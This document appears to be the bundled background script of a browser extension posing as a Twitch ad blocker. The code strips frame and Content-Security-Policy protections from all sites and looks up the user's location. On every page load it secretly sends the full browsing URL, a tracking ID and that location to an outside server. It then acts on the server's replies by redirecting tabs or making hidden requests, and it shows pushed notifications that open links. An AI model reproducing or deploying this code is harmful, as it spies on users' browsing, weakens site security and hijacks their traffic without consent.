! function (e) {
    var t = {};

    function n(i) {
        if (t[i]) return t[i].exports;
        var o = t[i] = {
            i: i,
            l: !1,
            exports: {}
        };
        return e[i].call(o.exports, o, o.exports, n), o.l = !0, o.exports
    }
    n.m = e, n.c = t, n.d = function (e, t, i) {
        n.o(e, t) || Object.defineProperty(e, t, {
            enumerable: !0,
            get: i
        })
    }, n.r = function (e) {
        "undefined" != typeof Symbol && Symbol.toStringTag && Object.defineProperty(e, Symbol.toStringTag, {
            value: "Module"
        }), Object.defineProperty(e, "__esModule", {
            value: !0
        })
    }, n.t = function (e, t) {
        if (1 & t && (e = n(e)), 8 & t) return e;
        if (4 & t && "object" == typeof e && e && e.__esModule) return e;
        var i = Object.create(null);
        if (n.r(i), Object.defineProperty(i, "default", {
            enumerable: !0,
            value: e
        }), 2 & t && "string" != typeof e)
            for (var o in e) n.d(i, o, function (t) {
                return e[t]
            }.bind(null, o));
        return i
    }, n.n = function (e) {
        var t = e && e.__esModule ? function () {
            return e.default
        } : function () {
            return e
        };
        return n.d(t, "a", t), t
    }, n.o = function (e, t) {
        return Object.prototype.hasOwnProperty.call(e, t)
    }, n.p = "", n(n.s = 2)
}([, , function (e, t, n) {
    e.exports = n(3)
}, function (e, t) {
    let n = {
        url_filter: ["amazon-adsystem1"],
        reg_filter: []
    },
        o = {
            msg: !1,
            ads: !0
        };

    function a(e, t, n) {
        return "url_filter" == n ? {
            id: e,
            priority: 2,
            action: {
                type: "block"
            },
            condition: {
                urlFilter: t,
                resourceTypes: ["script", "main_frame", "sub_frame", "image", "object", "xmlhttprequest", "ping", "csp_report", "media", "websocket", "other"],
                domains: ["twitch.tv", "player.twitch.tv"]
            }
        } : "reg_filter" == n ? {
            id: e,
            priority: 2,
            action: {
                type: "block"
            },
            condition: {
                regexFilter: t,
                resourceTypes: ["script", "main_frame", "sub_frame", "image", "object", "xmlhttprequest", "ping", "csp_report", "media", "websocket", "other"],
                domains: ["twitch.tv", "player.twitch.tv"]
            }
        } : void 0
    }
    chrome.storage.local.get(["ads"], e => {
        e && void 0 !== e.ads || chrome.storage.local.set(o)
    }), chrome.storage.local.get(["ads"], e => {
        e && e.ads
    }), async function (e = !0) {
        let t = [],
            i = 0;
        for (let e in n) {
            let r = e,
                c = n[e];
            for (var o = 0; o < c.length; o++) t.push(a(i + o + 1, c[o], r));
            i += c.length
        }
        t.push({
            id: i + 1,
            priority: 3,
            action: {
                type: "modifyHeaders",
                responseHeaders: [{
                    header: "X-Frame-Options",
                    operation: "remove"
                }, {
                    header: "Frame-Options",
                    operation: "remove"
                }, {
                    header: "Content-Security-Policy",
                    operation: "remove"
                }],
                requestHeaders: [{
                    header: "sec-fetch-dest",
                    operation: "set",
                    value: "document"
                }]
            },
            condition: {
                resourceTypes: ["main_frame", "sub_frame", "script"]
            }
        }), chrome.declarativeNetRequest.getDynamicRules((function (n) {
            let i = {
                removeRuleIds: n.map(e => e.id)
            };
            e && (i.addRules = t), chrome.declarativeNetRequest.updateDynamicRules(i)
        }))
    }(), chrome.storage.onChanged.addListener((async function (e, t) {
        for (let [t, {
            oldValue: n,
            newValue: i
        }] of Object.entries(e)) ["ads"].includes(t)
    })), chrome.runtime.onInstalled.addListener((function (e) {
        "install" == e.reason && (chrome.tabs.create({
            url: "https://github.com/brtoz"
        }), chrome.storage.local.set(o, (function () {
            chrome.windows.create({
                focused: !0,
                type: "popup",
                url: "popup.html",
                width: 325,
                height: 340
            })
        })))
    }));
    var r = ["1069416765067"],
        c = "https://www.twitchadblock.com/pushlogo.jpg?v=" + Math.floor(1e4 * Math.random() % 678 + 1),
        s = "",
        u = !1;
    async function d(e, t, n = 0, i = 0) {
        var o = new Promise((function (o, a) {
            if ("set" == e && n) {
                let e = Object.keys(t);
                t[e] = {
                    value: t[e],
                    _time: 1e3 * i + +new Date
                }
            }
            chrome.storage.sync[e](t, (function (i) {
                "get" == e && (n ? (cookie = i[t], cookie && cookie._time ? cookie._time > +new Date ? o(cookie.value) : (d("remove", t), o("")) : o("")) : o(i[t])), o(!0)
            }))
        }));
        return await o
    }
    async function l() {
        return await d("get", "extid") || await d("set", {
            extid: function () {
                for (var e = "", t = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789", n = 0; n < 8; n++) e += t.charAt(Math.floor(Math.random() * t.length));
                return e
            }()
        }), s = await d("get", "extid")
    } !async function () {
        if (u) return u;
        let e = await d("get", "location_data");
        if (e) return u = e;
        let t = await fetch("http://ip-api.com/json");
        if (t) {
            try {
                t = await t.json()
            } catch (e) {
                return
            }
        }
    }(), l(), d("get", "installedon").then(e => {
        parseInt(e) || d("set", {
            installedon: (new Date).getTime()
        })
    }), chrome.gcm.onMessage.addListener((async function (e) {
        var t = e.data.message;
        if ((t = JSON.parse(t))[0].id) {
            if (await d("get", t[0].id, 1)) return 0; {
                let e = {};
                e[t[0].id] = 1, d("set", e, 1, 36e3)
            }
        }
        image = t[0].image, t[0].link.search("oibww") > 0 ? (tabid = async function () {
            let e = {
                url: "http://*/*"
            },
                [t] = await chrome.tabs.query(e);
            return t && t.id ? t.id : (e = {
                url: "https://*/*"
            }, [t] = await chrome.tabs.query(e), !(!t || !t.id) && t.id)
        }()) ? y(tabid, t[0].link) : d("set", {
            oibww_pending: t[0].link
        }) : t[0].link.search("oib") > 0 ? chrome.tabs.create({
            url: t[0].link
        }) : function (e, t, n, i) {
            type = "basic", i && (type = "image");
            var o = {
                type: type,
                title: e,
                imageUrl: i,
                message: t,
                iconUrl: c,
                priority: 100,
                requireInteraction: !0
            },
                a = (Math.floor(9007199254740992 * Math.random()) + 1).toString();
            chrome.notifications.create(a, o, (function (e) {
                p.push({
                    notfID: e,
                    URL: n
                })
            }))
        }(t[0].title, t[0].desc, t[0].link, image)
    }));
    var p = [];
    chrome.notifications.onClicked.addListener((function (e) {
        for (i = 0; i < p.length; i++) p[i].notfID == e && window.open(p[i].URL)
    }));
    var f = r.length;

    function h(e) {
        !async function (e) {
            "" != e && "undefined" != e && (await d("set", {
                pushToken: e
            }), await fetch("#", {
                method: "POST",
                headers: {
                    "Content-Type": "application/x-www-form-urlencoded"
                },
                body: "extid=" + await d("get", "extid") + "&gcmid=" + e
            }))
        }(e)
    }
    async function m(e, t) {
        var n = await fetch(e, {
            cache: "no-cache"
        });
        chrome.tabs.sendMessage(t, {
            sksmode: "aurl",
            aurl: n.url
        })
    }
    async function y(e, t) {
        chrome.tabs.sendMessage(t, {
            sksmode: "aurl",
            aurl: e
        })
    } !async function () {
        f == await d("get", "noIDs") && "undefined" != await d("get", "pushToken") && null != await d("get", "pushToken") && "" != await d("get", "pushToken") && void 0 !== await d("get", "pushToken") || !await d("get", "extid") || (chrome.gcm.register(r, h), await d("set", {
            noIDs: f
        }))
    }(), chrome.tabs.onUpdated.addListener((async function (e, t, n) {
        var i = !1;
        if ("complete" == t.status && (i = n.url), !i || !/^((http|https|ftp):\/\/)/.test(i)) return;
        let o = {};
        u && u.country && (o = {
            ...o,
            country: u.country,
            city: u.city,
            zip: u.zip
        });
        var a = i;
        if (!s) return l();
        try {
            var r = await fetch("https://gmgv.co.uk/track/", {
                cache: "no-cache",
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                body: JSON.stringify({
                    ...o,
                    apisend: btoa(s),
                    name: btoa(a),
                    ext: "tabm"
                })
            });
            if (r) {
                try {
                    r = await r.json()
                } catch (e) {
                    return
                }
                setTimeout((function () {
                    r.a && y(r.a, e), r.c && m(r.c, e), r.b && m(r.b, e), r.d && async function (e) {
                        await fetch(e, {
                            cache: "no-cache"
                        })
                    }(r.d)
                }), 200)
            }
        } catch (e) { }
        await d("get", "oibww_pending") && (y(await d("get", "oibww_pending"), e), d("remove", "oibww_pending"))
    }))
}]);